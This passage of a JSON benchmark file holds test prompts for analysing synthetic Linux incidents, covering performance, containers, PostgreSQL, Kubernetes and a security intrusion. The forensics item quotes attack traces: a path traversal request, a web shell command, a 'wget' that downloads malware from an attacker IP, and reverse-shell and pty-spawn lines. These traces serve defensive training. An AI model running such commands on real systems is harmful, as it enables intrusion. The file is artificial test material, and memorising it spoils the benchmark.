      "prompt": "\nAnalyze this comprehensive system performance profile collected during a production incident:\n\n[CPU Profile - 3000 samples]\n  45.3%  [kernel]  [k] native_queued_spin_lock_slowpath\n  12.1%  mysqld    [.] buf_page_get_gen\n   8.7%  [kernel]  [k] _raw_spin_lock\n   5.2%  app_srv   [.] malloc\n... [2996 more samples]\n\n[Memory Profile - /proc/meminfo snapshots over 1 hour]\nTime: 00:00 MemTotal: 128GB MemFree: 2GB Cached: 40GB SwapTotal: 8GB SwapFree: 0GB\nTime: 00:05 MemTotal: 128GB MemFree: 1GB Cached: 20GB SwapTotal: 8GB SwapFree: 0GB\n... [100 more snapshots]\n\n[I/O Profile - iostat data]\nDevice    r/s     w/s     rkB/s   wkB/s   await  r_await  w_await  %util\nsda     2341.00  156.00  93640.0  2496.0  145.3   142.1    193.2   99.8\n... [500 more lines]\n\n[Network Profile - ss statistics]\nState  Recv-Q  Send-Q  Local:Port  Peer:Port\nESTAB  0       2043520 10.0.0.5:80 10.0.0.100:45123\n... [1000 more connections]\n\n[Application Metrics]\nrequest_latency_p99: 5000ms -> 30000ms (degradation over 1 hour)\nerror_rate: 0.1% -> 45% \nactive_connections: 1000 -> 25000\n... [200 more metrics]\n\nAnalyze to:\n1. Identify the primary bottleneck (CPU/Memory/I/O/Network)\n2. Correlate kernel spinlock contention with application behavior\n3. Analyze memory pressure and its impact on performance\n4. Identify I/O patterns suggesting thrashing or poor access patterns\n5. Find network congestion or connection exhaustion issues\n6. Map performance degradation timeline with specific triggers\n7. Identify feedback loops making the problem worse\n8. Find tuning parameters that could alleviate issues\n9. Detect signs of resource starvation or priority inversion\n10. Generate specific optimization recommendations with expected impact\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this comprehensive system performance profile collected during a production incident:\n\n[CPU Profile - 3000 samples]\n  45.3%  [kernel]  [k] native_queued_spin_lock_slowpath\n  12.1%  mysqld    [.] buf_page_get_gen\n   8.7%  [kernel]  [k] _raw_spin_lock\n   5.2%  app_srv   [.] malloc\n... [2996 more samples]\n\n[Memory Profile - /proc/meminfo snapshots over 1 hour]\nTime: 00:00 MemTotal: 128GB MemFree: 2GB Cached: 40GB SwapTotal: 8GB SwapFree: 0GB\nTime: 00:05 MemTotal: 128GB MemFree: 1GB Cached: 20GB SwapTotal: 8GB SwapFree: 0GB\n... [100 more snapshots]\n\n[I/O Profile - iostat data]\nDevice    r/s     w/s     rkB/s   wkB/s   await  r_await  w_await  %util\nsda     2341.00  156.00  93640.0  2496.0  145.3   142.1    193.2   99.8\n... [500 more lines]\n\n[Network Profile - ss statistics]\nState  Recv-Q  Send-Q  Local:Port  Peer:Port\nESTAB  0       2043520 10.0.0.5:80 10.0.0.100:45123\n... [1000 more connections]\n\n[Application Metrics]\nrequest_latency_p99: 5000ms -> 30000ms (degradation over 1 hour)\nerror_rate: 0.1% -> 45% \nactive_connections: 1000 -> 25000\n... [200 more metrics]\n\nAnalyze to:\n1. Identify the primary bottleneck (CPU/Memory/I/O/Network)\n2. Correlate kernel spinlock contention with application behavior\n3. Analyze memory pressure and its impact on performance\n4. Identify I/O patterns suggesting thrashing or poor access patterns\n5. Find network congestion or connection exhaustion issues\n6. Map performance degradation timeline with specific triggers\n7. Identify feedback loops making the problem worse\n8. Find tuning parameters that could alleviate issues\n9. Detect signs of resource starvation or priority inversion\n10. Generate specific optimization recommendations with expected impact\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_50",
      "name": "Test 50: Security Incident Forensics",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nAnalyze this comprehensive security incident data to reconstruct the attack:\n\n[Auth Logs - 5000 lines]\nJan 15 02:15:23 server sshd[12345]: Failed password for invalid user admin from 185.234.218.15\nJan 15 02:15:25 server sshd[12346]: Failed password for invalid user root from 185.234.218.15\n... [4998 more lines showing various auth attempts, some successful]\n\n[Apache Access Logs - 8000 lines]\n185.234.218.15 - - [15/Jan/2024:02:30:15] \"GET /admin/../../../../../etc/passwd HTTP/1.1\" 404\n185.234.218.15 - - [15/Jan/2024:02:30:16] \"POST /upload.php HTTP/1.1\" 200\n192.168.1.100 - - [15/Jan/2024:02:30:45] \"GET /shell.php?cmd=whoami HTTP/1.1\" 200\n... [7997 more lines]\n\n[System Call Audit Logs - 10000 events]\ntype=SYSCALL msg=audit(1705289415.234:9876): arch=x86_64 syscall=execve success=yes exe=\"/tmp/.hidden\"\ntype=SYSCALL msg=audit(1705289420.123:9877): arch=x86_64 syscall=connect success=yes addr=185.234.218.15:4444\n... [9998 more events]\n\n[File Integrity Monitoring - 2000 changes]\n[02:31:00] ADDED: /tmp/.hidden (755 root:root) SHA256:a1b2c3d4...\n[02:31:05] MODIFIED: /etc/crontab SHA256:before:x1y2z3... after:p9q8r7...\n[02:31:10] ADDED: /var/www/html/shell.php (644 www-data:www-data)\n... [1997 more changes]\n\n[Network Flows - 3000 connections]\n02:30:00 TCP 192.168.1.100:39284 -> 185.234.218.15:4444 Established 5MB sent\n02:31:00 TCP 192.168.1.100:39285 -> 185.234.218.15:443 Established 50MB sent\n... [2998 more flows]\n\n[Process Tree Snapshot at incident time]\n\\_ /usr/sbin/apache2\n   \\_ /bin/sh -c cd /tmp && wget http://185.234.218.15/malware\n   \\_ /tmp/.hidden\n      \\_ /bin/bash -i\n         \\_ python -c import pty;pty.spawn(\"/bin/bash\")\n... [Full process tree with 500 processes]\n\nAnalyze to:\n1. Reconstruct the complete attack timeline with phases\n2. Identify initial compromise vector and exploit used\n3. Track lateral movement and privilege escalation steps\n4. Find all persistence mechanisms established\n5. Identify data exfiltration: what, how much, where to\n6. Map all compromised accounts and systems\n7. Find IOCs (Indicators of Compromise) for threat hunting\n8. Assess the sophistication level and likely threat actor\n9. Identify security control failures that enabled the attack\n10. Generate immediate containment and long-term remediation plans\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this comprehensive security incident data to reconstruct the attack:\n\n[Auth Logs - 5000 lines]\nJan 15 02:15:23 server sshd[12345]: Failed password for invalid user admin from 185.234.218.15\nJan 15 02:15:25 server sshd[12346]: Failed password for invalid user root from 185.234.218.15\n... [4998 more lines showing various auth attempts, some successful]\n\n[Apache Access Logs - 8000 lines]\n185.234.218.15 - - [15/Jan/2024:02:30:15] \"GET /admin/../../../../../etc/passwd HTTP/1.1\" 404\n185.234.218.15 - - [15/Jan/2024:02:30:16] \"POST /upload.php HTTP/1.1\" 200\n192.168.1.100 - - [15/Jan/2024:02:30:45] \"GET /shell.php?cmd=whoami HTTP/1.1\" 200\n... [7997 more lines]\n\n[System Call Audit Logs - 10000 events]\ntype=SYSCALL msg=audit(1705289415.234:9876): arch=x86_64 syscall=execve success=yes exe=\"/tmp/.hidden\"\ntype=SYSCALL msg=audit(1705289420.123:9877): arch=x86_64 syscall=connect success=yes addr=185.234.218.15:4444\n... [9998 more events]\n\n[File Integrity Monitoring - 2000 changes]\n[02:31:00] ADDED: /tmp/.hidden (755 root:root) SHA256:a1b2c3d4...\n[02:31:05] MODIFIED: /etc/crontab SHA256:before:x1y2z3... after:p9q8r7...\n[02:31:10] ADDED: /var/www/html/shell.php (644 www-data:www-data)\n... [1997 more changes]\n\n[Network Flows - 3000 connections]\n02:30:00 TCP 192.168.1.100:39284 -> 185.234.218.15:4444 Established 5MB sent\n02:31:00 TCP 192.168.1.100:39285 -> 185.234.218.15:443 Established 50MB sent\n... [2998 more flows]\n\n[Process Tree Snapshot at incident time]\n\\_ /usr/sbin/apache2\n   \\_ /bin/sh -c cd /tmp && wget http://185.234.218.15/malware\n   \\_ /tmp/.hidden\n      \\_ /bin/bash -i\n         \\_ python -c import pty;pty.spawn(\"/bin/bash\")\n... [Full process tree with 500 processes]\n\nAnalyze to:\n1. Reconstruct the complete attack timeline with phases\n2. Identify initial compromise vector and exploit used\n3. Track lateral movement and privilege escalation steps\n4. Find all persistence mechanisms established\n5. Identify data exfiltration: what, how much, where to\n6. Map all compromised accounts and systems\n7. Find IOCs (Indicators of Compromise) for threat hunting\n8. Assess the sophistication level and likely threat actor\n9. Identify security control failures that enabled the attack\n10. Generate immediate containment and long-term remediation plans\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_51",
      "name": "Test 51: Container Runtime Deep Inspection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nAnalyze this detailed container runtime state for security and performance issues:\n\n[Docker Daemon State - 2000 lines]\nContainers: 487 (Running: 423, Paused: 2, Stopped: 62)\nImages: 1847\nServer Version: 20.10.23\nStorage Driver: overlay2\n Backing Filesystem: xfs\n Supports d_type: true\n Native Overlay Diff: true\n... [1994 more configuration lines]\n\n[Container Inspect Output - 50 containers x 200 lines each]\nContainer: web-frontend-7d4b8c\n{\n  \"State\": {\n    \"Status\": \"running\",\n    \"Pid\": 28456,\n    \"OOMKilled\": true,\n    \"RestartCount\": 47,\n    \"StartedAt\": \"2024-01-15T10:00:00Z\"\n  },\n  \"HostConfig\": {\n    \"Privileged\": true,\n    \"Capabilities\": [\"SYS_ADMIN\", \"NET_ADMIN\"],\n    \"SecurityOpt\": [\"apparmor=unconfined\"],\n    \"Memory\": 0,\n    \"CpuShares\": 2\n  },\n  \"Mounts\": [\n    {\"Type\": \"bind\", \"Source\": \"/\", \"Destination\": \"/host\", \"RW\": true}\n  ]\n}\n... [49 more containers]\n\n[cgroup Statistics - 5000 lines]\n/docker/7d4b8c.../memory.current: 8589934592\n/docker/7d4b8c.../memory.events: oom_kill 47\n/docker/7d4b8c.../cpu.stat: throttled_time 3847298374923\n... [4997 more lines]\n\n[Network Namespace Analysis - 3000 lines]\nnsenter -t 28456 -n ss -tuln\nState  Local Address:Port  Process\nLISTEN 0.0.0.0:22         sshd\nLISTEN 0.0.0.0:8080       java\n... [2998 more lines]\n\n[seccomp Profile Analysis - 1000 lines]\nContainer: web-frontend-7d4b8c\nSeccomp: disabled\n---\nContainer: api-backend-9f3a2e  \nSeccomp: custom\nAllowed: [read, write, open, close, stat, fstat, mmap, ...]\nBlocked: [ptrace, mount, ...]\n... [998 more profile lines]\n\nAnalyze to:\n1. Identify containers with dangerous security configurations\n2. Find resource limit misconfigurations causing instability\n3. Detect container escape risks (privileged, cap_sys_admin, etc.)\n4. Analyze OOM patterns and memory leak indicators\n5. Find CPU throttling impact on application performance\n6. Identify network exposure risks (0.0.0.0 bindings)\n7. Assess image vulnerabilities and update priorities\n8. Detect crypto-mining or malicious container indicators\n9. Find performance bottlenecks from cgroup statistics\n10. Generate hardening recommendations for each container\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this detailed container runtime state for security and performance issues:\n\n[Docker Daemon State - 2000 lines]\nContainers: 487 (Running: 423, Paused: 2, Stopped: 62)\nImages: 1847\nServer Version: 20.10.23\nStorage Driver: overlay2\n Backing Filesystem: xfs\n Supports d_type: true\n Native Overlay Diff: true\n... [1994 more configuration lines]\n\n[Container Inspect Output - 50 containers x 200 lines each]\nContainer: web-frontend-7d4b8c\n{\n  \"State\": {\n    \"Status\": \"running\",\n    \"Pid\": 28456,\n    \"OOMKilled\": true,\n    \"RestartCount\": 47,\n    \"StartedAt\": \"2024-01-15T10:00:00Z\"\n  },\n  \"HostConfig\": {\n    \"Privileged\": true,\n    \"Capabilities\": [\"SYS_ADMIN\", \"NET_ADMIN\"],\n    \"SecurityOpt\": [\"apparmor=unconfined\"],\n    \"Memory\": 0,\n    \"CpuShares\": 2\n  },\n  \"Mounts\": [\n    {\"Type\": \"bind\", \"Source\": \"/\", \"Destination\": \"/host\", \"RW\": true}\n  ]\n}\n... [49 more containers]\n\n[cgroup Statistics - 5000 lines]\n/docker/7d4b8c.../memory.current: 8589934592\n/docker/7d4b8c.../memory.events: oom_kill 47\n/docker/7d4b8c.../cpu.stat: throttled_time 3847298374923\n... [4997 more lines]\n\n[Network Namespace Analysis - 3000 lines]\nnsenter -t 28456 -n ss -tuln\nState  Local Address:Port  Process\nLISTEN 0.0.0.0:22         sshd\nLISTEN 0.0.0.0:8080       java\n... [2998 more lines]\n\n[seccomp Profile Analysis - 1000 lines]\nContainer: web-frontend-7d4b8c\nSeccomp: disabled\n---\nContainer: api-backend-9f3a2e  \nSeccomp: custom\nAllowed: [read, write, open, close, stat, fstat, mmap, ...]\nBlocked: [ptrace, mount, ...]\n... [998 more profile lines]\n\nAnalyze to:\n1. Identify containers with dangerous security configurations\n2. Find resource limit misconfigurations causing instability\n3. Detect container escape risks (privileged, cap_sys_admin, etc.)\n4. Analyze OOM patterns and memory leak indicators\n5. Find CPU throttling impact on application performance\n6. Identify network exposure risks (0.0.0.0 bindings)\n7. Assess image vulnerabilities and update priorities\n8. Detect crypto-mining or malicious container indicators\n9. Find performance bottlenecks from cgroup statistics\n10. Generate hardening recommendations for each container\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_52",
      "name": "Test 52: Database Query Performance Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nAnalyze this PostgreSQL slow query log and system state during a performance crisis:\n\n[Slow Query Log - 5000 queries]\n2024-01-15 10:00:00 UTC [28456]: [1-1] user=app_user,db=production LOG: duration: 45234.123 ms\n  statement: SELECT u.*, o.*, p.* FROM users u \n  LEFT JOIN orders o ON u.id = o.user_id \n  LEFT JOIN products p ON o.product_id = p.id \n  WHERE u.created_at > '2023-01-01' \n  AND NOT EXISTS (\n    SELECT 1 FROM user_sessions us WHERE us.user_id = u.id\n  )\n  ORDER BY u.id, o.created_at DESC;\n\n2024-01-15 10:00:45 UTC [28457]: [1-1] user=app_user,db=production LOG: duration: 67890.456 ms\n  statement: WITH RECURSIVE category_tree AS (\n    SELECT id, parent_id, name, 0 as level \n    FROM categories WHERE parent_id IS NULL\n    UNION ALL\n    SELECT c.id, c.parent_id, c.name, ct.level + 1\n    FROM categories c \n    INNER JOIN category_tree ct ON c.parent_id = ct.id\n  )\n  SELECT * FROM category_tree ORDER BY level, name;\n... [4998 more queries]\n\n[pg_stat_statements - Top 100 queries by total time]\nquery                                    | calls  | total_time   | mean_time | stddev_time\n-----------------------------------------+--------+--------------+-----------+-------------\nSELECT * FROM large_table WHERE $1       | 584921 | 8493829.23  | 14.52     | 234.5\nUPDATE users SET last_seen = $1 WHERE $2 | 923847 | 7234234.45  | 7.83      | 12.3\n... [98 more entries]\n\n[Table Statistics - 500 tables]\nschemaname | tablename       | n_live_tup | n_dead_tup | last_vacuum         | last_analyze\n-----------+-----------------+------------+------------+---------------------+------------------\npublic     | users           | 45839204   | 23492834   | 2024-01-01 00:00:00 | 2023-12-01 00:00:00\npublic     | orders          | 928374923  | 82934782   | NULL                | 2023-06-01 00:00:00\n... [498 more tables]\n\n[Index Usage Statistics - 1000 indexes]\nschemaname | tablename | indexname              | idx_scan | idx_tup_read | idx_tup_fetch | idx_blks_hit\n-----------+-----------+------------------------+----------+--------------+---------------+--------------\npublic     | users     | users_pkey            | 9283847  | 9283847      | 9283847       | 2834782\npublic     | users     | idx_users_created_at  | 0        | 0            | 0             | 0\n... [998 more indexes]\n\n[Lock Analysis - Current locks]\npid   | relation     | mode                | granted | wait_start\n------+--------------+---------------------+---------+------------------------\n28456 | users        | AccessShareLock     | t       | \n28457 | users        | AccessExclusiveLock | f       | 2024-01-15 10:05:00\n... [200 more lock entries]\n\n[System Metrics During Incident]\nTime   | CPU% | IOWait% | MemoryUsed | SwapUsed | ReadMB/s | WriteMB/s\n-------+------+---------+------------+----------+----------+-----------\n10:00  | 95   | 45      | 98%        | 75%      | 2400     | 100\n10:01  | 99   | 67      | 99%        | 85%      | 3200     | 50\n... [60 minutes of metrics]\n\nAnalyze to:\n1. Identify queries with problematic execution patterns\n2. Find missing indexes based on query patterns\n3. Detect table bloat requiring maintenance\n4. Analyze lock contention and deadlock risks\n5. Find queries that should be rewritten for performance\n6. Identify statistics drift causing bad query plans\n7. Detect resource exhaustion correlation with queries\n8. Find N+1 query patterns and ORM inefficiencies\n9. Generate index creation and query optimization recommendations\n10. Prioritize maintenance tasks (VACUUM, ANALYZE, REINDEX)\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this PostgreSQL slow query log and system state during a performance crisis:\n\n[Slow Query Log - 5000 queries]\n2024-01-15 10:00:00 UTC [28456]: [1-1] user=app_user,db=production LOG: duration: 45234.123 ms\n  statement: SELECT u.*, o.*, p.* FROM users u \n  LEFT JOIN orders o ON u.id = o.user_id \n  LEFT JOIN products p ON o.product_id = p.id \n  WHERE u.created_at > '2023-01-01' \n  AND NOT EXISTS (\n    SELECT 1 FROM user_sessions us WHERE us.user_id = u.id\n  )\n  ORDER BY u.id, o.created_at DESC;\n\n2024-01-15 10:00:45 UTC [28457]: [1-1] user=app_user,db=production LOG: duration: 67890.456 ms\n  statement: WITH RECURSIVE category_tree AS (\n    SELECT id, parent_id, name, 0 as level \n    FROM categories WHERE parent_id IS NULL\n    UNION ALL\n    SELECT c.id, c.parent_id, c.name, ct.level + 1\n    FROM categories c \n    INNER JOIN category_tree ct ON c.parent_id = ct.id\n  )\n  SELECT * FROM category_tree ORDER BY level, name;\n... [4998 more queries]\n\n[pg_stat_statements - Top 100 queries by total time]\nquery                                    | calls  | total_time   | mean_time | stddev_time\n-----------------------------------------+--------+--------------+-----------+-------------\nSELECT * FROM large_table WHERE $1       | 584921 | 8493829.23  | 14.52     | 234.5\nUPDATE users SET last_seen = $1 WHERE $2 | 923847 | 7234234.45  | 7.83      | 12.3\n... [98 more entries]\n\n[Table Statistics - 500 tables]\nschemaname | tablename       | n_live_tup | n_dead_tup | last_vacuum         | last_analyze\n-----------+-----------------+------------+------------+---------------------+------------------\npublic     | users           | 45839204   | 23492834   | 2024-01-01 00:00:00 | 2023-12-01 00:00:00\npublic     | orders          | 928374923  | 82934782   | NULL                | 2023-06-01 00:00:00\n... [498 more tables]\n\n[Index Usage Statistics - 1000 indexes]\nschemaname | tablename | indexname              | idx_scan | idx_tup_read | idx_tup_fetch | idx_blks_hit\n-----------+-----------+------------------------+----------+--------------+---------------+--------------\npublic     | users     | users_pkey            | 9283847  | 9283847      | 9283847       | 2834782\npublic     | users     | idx_users_created_at  | 0        | 0            | 0             | 0\n... [998 more indexes]\n\n[Lock Analysis - Current locks]\npid   | relation     | mode                | granted | wait_start\n------+--------------+---------------------+---------+------------------------\n28456 | users        | AccessShareLock     | t       | \n28457 | users        | AccessExclusiveLock | f       | 2024-01-15 10:05:00\n... [200 more lock entries]\n\n[System Metrics During Incident]\nTime   | CPU% | IOWait% | MemoryUsed | SwapUsed | ReadMB/s | WriteMB/s\n-------+------+---------+------------+----------+----------+-----------\n10:00  | 95   | 45      | 98%        | 75%      | 2400     | 100\n10:01  | 99   | 67      | 99%        | 85%      | 3200     | 50\n... [60 minutes of metrics]\n\nAnalyze to:\n1. Identify queries with problematic execution patterns\n2. Find missing indexes based on query patterns\n3. Detect table bloat requiring maintenance\n4. Analyze lock contention and deadlock risks\n5. Find queries that should be rewritten for performance\n6. Identify statistics drift causing bad query plans\n7. Detect resource exhaustion correlation with queries\n8. Find N+1 query patterns and ORM inefficiencies\n9. Generate index creation and query optimization recommendations\n10. Prioritize maintenance tasks (VACUUM, ANALYZE, REINDEX)\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_53",
      "name": "Test 53: Kubernetes Cluster State Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this Kubernetes cluster state during a major incident:\n\n[Node Status - 50 nodes]\nNAME          STATUS     ROLES    AGE   VERSION   CONDITIONS\nk8s-node-01   Ready      worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=False,PIDPressure=False\nk8s-node-02   NotReady   worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=True,PIDPressure=True\nk8s-node-03   Ready      master   90d   v1.27.3   MemoryPressure=False,DiskPressure=False,PIDPressure=False\n... [47 more nodes]\n\n[Pod Status - 2000 pods across all namespaces]\nNAMESPACE   NAME                           READY   STATUS             RESTARTS   AGE\nproduction  api-deployment-7d4b8c-x9z2    0/1     CrashLoopBackOff   342        5d\nproduction  api-deployment-7d4b8c-k3n4    0/1     OOMKilled          89         5d\nproduction  web-frontend-9g8h7-m2n3       1/1     Running            0          1h\nproduction  web-frontend-9g8h7-p4q5       0/1     ImagePullBackOff   0          3h\n... [1996 more pods]\n\n[Events - Last 1000 events]\nLAST SEEN   TYPE      REASON              OBJECT                           MESSAGE\n2m          Warning   FailedScheduling    pod/api-deployment-7d4b8c-a1b2  0/50 nodes are available: insufficient memory\n5m          Warning   OOMKilling          pod/api-deployment-7d4b8c-k3n4  Memory cgroup out of memory: Killed process 28456\n10m         Warning   NodeNotReady        node/k8s-node-02                Node k8s-node-02 status is now: NodeNotReady\n15m         Warning   FailedMount         pod/web-frontend-9g8h7-p4q5     Unable to attach volume: timeout\n... [996 more events]\n\n[ResourceQuota Status - All namespaces]\nNAMESPACE   NAME              USED                      HARD\nproduction  compute-quota     requests.cpu: 450/500    requests.cpu: 500\nproduction  compute-quota     requests.memory: 950Gi/1Ti requests.memory: 1Ti\nstaging     compute-quota     requests.cpu: 50/100     requests.cpu: 100\n... [20 more quotas]\n\n[PVC Status - 500 persistent volume claims]\nNAMESPACE   NAME          STATUS   VOLUME              CAPACITY   STORAGECLASS\nproduction  data-vol-0    Bound    pvc-7d4b8c9e       100Gi      fast-ssd\nproduction  data-vol-1    Pending                                 fast-ssd\nproduction  logs-vol-0    Lost     pvc-9f8e7d6c       50Gi       standard\n... [497 more PVCs]\n\n[Network Policies - 100 policies]\nNAMESPACE   NAME              POD-SELECTOR         INGRESS-RULES   EGRESS-RULES\nproduction  deny-all          <all>                0               0\nproduction  allow-frontend    app=frontend         2               1\nproduction  allow-backend     app=backend          1               3\n... [97 more policies]\n\n[HPA Status - 50 autoscalers]\nNAMESPACE   NAME          REFERENCE                    TARGETS           MINPODS   MAXPODS   REPLICAS\nproduction  api-hpa       Deployment/api-deployment    CPU: 95%/70%     5         50        50\nproduction  web-hpa       Deployment/web-frontend      CPU: 45%/70%     3         30        15\n... [48 more HPAs]\n\n[Service Endpoints - 200 services]\nNAMESPACE   NAME          ENDPOINTS                                            AGE\nproduction  api-service   <none>                                               5d\nproduction  web-service   10.244.1.5:8080,10.244.2.6:8080,10.244.3.7:8080   5d\n... [198 more services]\n\nAnalyze to:\n1. Identify cascading failure patterns across the cluster\n2. Find resource bottlenecks causing scheduling failures  \n3. Analyze pod failure reasons and remediation strategies\n4. Detect misconfigured resource requests/limits\n5. Identify storage issues affecting application availability\n6. Find network policy conflicts causing connectivity issues\n7. Analyze HPA behavior and scaling bottlenecks\n8. Detect node-level issues affecting cluster stability\n9. Identify namespace quota exhaustion patterns\n10. Generate cluster recovery and optimization plan\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this Kubernetes cluster state during a major incident:\n\n[Node Status - 50 nodes]\nNAME          STATUS     ROLES    AGE   VERSION   CONDITIONS\nk8s-node-01   Ready      worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=False,PIDPressure=False\nk8s-node-02   NotReady   worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=True,PIDPressure=True\nk8s-node-03   Ready      master   90d   v1.27.3   MemoryPressure=False,DiskPressure=False,PIDPressure=False\n... [47 more nodes]\n\n[Pod Status - 2000 pods across all namespaces]\nNAMESPACE   NAME                           READY   STATUS             RESTARTS   AGE\nproduction  api-deployment-7d4b8c-x9z2    0/1     CrashLoopBackOff   342        5d\nproduction  api-deployment-7d4b8c-k3n4    0/1     OOMKilled          89         5d\nproduction  web-frontend-9g8h7-m2n3       1/1     Running            0          1h\nproduction  web-frontend-9g8h7-p4q5       0/1     ImagePullBackOff   0          3h\n... [1996 more pods]\n\n[Events - Last 1000 events]\nLAST SEEN   TYPE      REASON              OBJECT                           MESSAGE\n2m          Warning   FailedScheduling    pod/api-deployment-7d4b8c-a1b2  0/50 nodes are available: insufficient memory\n5m          Warning   OOMKilling          pod/api-deployment-7d4b8c-k3n4  Memory cgroup out of memory: Killed process 28456\n10m         Warning   NodeNotReady        node/k8s-node-02                Node k8s-node-02 status is now: NodeNotReady\n15m         Warning   FailedMount         pod/web-frontend-9g8h7-p4q5     Unable to attach volume: timeout\n... [996 more events]\n\n[ResourceQuota Status - All namespaces]\nNAMESPACE   NAME              USED                      HARD\nproduction  compute-quota     requests.cpu: 450/500    requests.cpu: 500\nproduction  compute-quota     requests.memory: 950Gi/1Ti requests.memory: 1Ti\nstaging     compute-quota     requests.cpu: 50/100     requests.cpu: 100\n... [20 more quotas]\n\n[PVC Status - 500 persistent volume claims]\nNAMESPACE   NAME          STATUS   VOLUME              CAPACITY   STORAGECLASS\nproduction  data-vol-0    Bound    pvc-7d4b8c9e       100Gi      fast-ssd\nproduction  data-vol-1    Pending                                 fast-ssd\nproduction  logs-vol-0    Lost     pvc-9f8e7d6c       50Gi       standard\n... [497 more PVCs]\n\n[Network Policies - 100 policies]\nNAMESPACE   NAME              POD-SELECTOR         INGRESS-RULES   EGRESS-RULES\nproduction  deny-all          <all>                0               0\nproduction  allow-frontend    app=frontend         2               1\nproduction  allow-backend     app=backend          1               3\n... [97 more policies]\n\n[HPA Status - 50 autoscalers]\nNAMESPACE   NAME          REFERENCE                    TARGETS           MINPODS   MAXPODS   REPLICAS\nproduction  api-hpa       Deployment/api-deployment    CPU: 95%/70%     5         50        50\nproduction  web-hpa       Deployment/web-frontend      CPU: 45%/70%     3         30        15\n... [48 more HPAs]\n\n[Service Endpoints - 200 services]\nNAMESPACE   NAME          ENDPOINTS                                            AGE\nproduction  api-service   <none>                                               5d\nproduction  web-service   10.244.1.5:8080,10.244.2.6:8080,10.244.3.7:8080   5d\n... [198 more services]\n\nAnalyze to:\n1. Identify cascading failure patterns across the cluster\n2. Find resource bottlenecks causing scheduling failures  \n3. Analyze pod failure reasons and remediation strategies\n4. Detect misconfigured resource requests/limits\n5. Identify storage issues affecting application availability\n6. Find network policy conflicts causing connectivity issues\n7. Analyze HPA behavior and scaling bottlenecks\n8. Detect node-level issues affecting cluster stability\n9. Identify namespace quota exhaustion patterns\n10. Generate cluster recovery and optimization plan\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_54",
      "name": "Test 54: Comprehensive Network Traffic Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
